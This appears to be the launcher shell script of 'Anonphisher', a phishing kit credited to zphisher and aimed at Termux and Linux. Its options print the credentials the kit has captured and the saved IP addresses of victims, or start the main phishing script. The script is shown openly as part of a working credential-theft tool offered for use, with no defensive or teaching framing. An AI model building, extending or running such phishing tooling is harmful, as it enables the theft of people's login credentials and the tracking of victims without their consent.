#!/bin/bash
#Created by AnonyminHack5
# Credits to https://github.com/htr-tech/zphisher

if [[ $(uname -o) == *'Android'* ]];then
	ANONPHISHER_ROOT="/data/data/com.termux/files/usr/opt/anonphisher"
else
	export ANONPHISHER_ROOT="/opt/anonphisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run Anonphisher type \`anonphisher\` in your cmd " 
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | logs : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'logs' ]]; then
	cat $ANONPHISHER_ROOT/.termuxhackz/www/usernames.txt 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $ANONPHISHER_ROOT/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $ANONPHISHER_ROOT
	bash ./anonphisher.sh
fi